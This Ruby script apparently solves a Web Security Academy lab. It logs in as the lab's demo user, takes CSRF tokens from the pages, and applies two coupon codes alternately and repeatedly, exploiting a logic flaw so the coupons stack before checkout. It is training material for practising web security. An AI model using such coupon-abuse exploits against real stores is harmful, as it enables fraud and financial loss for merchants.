require 'http'
require 'nokogiri'

url='https://0a5e0044043407d58007859d00e70038.web-security-academy.net'

#1. Login as wiener
puts 'Logging in as wiener...'
login_csrf = ''
login = HTTP.get(url+'/login')
temp1 = Nokogiri.parse login.body.to_s
temp1.search(:tag,'input').to_a.each {|d| login_csrf = d.attr('value') if d.attr('name')=='csrf'}
login_client = HTTP.cookies('session'=>"#{login['Set-Cookie'].split(';')[0].split('=')[1]}").post(url+'/login',:form => {
		"csrf"=>"#{login_csrf}",
		"username"=>"wiener",
		"password"=>"peter"
		})

cookie = login_client['Set-Cookie'].split(';')[0].split('=')[1]
puts 'Extracting cookie...'

auth_client = HTTP.cookies("session"=>cookie)

#2. Add product to cart
puts 'Exploiting the vuln...'

resp_cart = auth_client.post(url+'/cart',:form => {
	"productId"=>"1",
	"redir"=>"PRODUCT",
	"quantity"=>"1",
	"price"=>"133700"
})

csrf =''
get_cart = auth_client.get(url+'/cart')
temp2 = Nokogiri.parse get_cart.body.to_s
temp2.search(:tag,'input').to_a.each {|d| csrf = d.attr('value') if d.attr('name')=='csrf'}

4.times do
	client = auth_client.post(url+'/cart/coupon',:form => {
		:csrf => "#{csrf}",
		:coupon => "SIGNUP30"
	})

	client = auth_client.post(url+'/cart/coupon',:form => {
		:csrf => "#{csrf}",
		:coupon => "NEWCUST5"
	})
end

get_cart = auth_client.get(url+'/cart')
puts get_cart.body.to_s
#3. Checkout
puts 'Checking out'
resp_checkout = auth_client.post(url+'/cart/checkout',:form=>{ "csrf"=>"#{csrf}" })
puts "Success" if resp_checkout['Location']
puts resp_checkout['Location']
puts cookie
